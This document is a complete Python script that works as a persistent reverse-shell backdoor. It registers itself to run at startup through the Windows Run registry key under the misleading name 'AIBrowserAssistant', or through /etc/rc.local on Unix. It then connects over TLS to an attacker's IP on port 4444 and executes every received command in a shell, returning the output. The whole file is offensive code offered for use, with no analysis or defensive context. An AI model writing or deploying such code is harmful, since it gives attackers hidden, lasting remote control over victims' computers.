import os
import socket
import ssl
import subprocess

def add_to_startup():
    script_path = os.path.abspath(__file__)
    if os.name == 'nt':
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "AIBrowserAssistant", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    elif os.name == 'posix':
        startup_script = f'echo "{script_path}" >> /etc/rc.local'
        os.system(startup_script)


def connection_company():
    attacker_ip = '' #Enter the attacker's IP address here
    attacker_port = 4444
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = context.wrap_socket(s, server_hostname=attacker_ip)
    ssl_sock.connect((attacker_ip, attacker_port))
    while True:
        command = ssl_sock.recv(1024).decode('utf-8')
        if 'exit' in command:
            ssl_sock.close()
            break
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            ssl_sock.send(output.encode('utf-8'))
        except Exception as e:
            ssl_sock.send(str(e).encode('utf-8'))

if __name__ == "__main__":
    add_to_startup()
    connection_company()
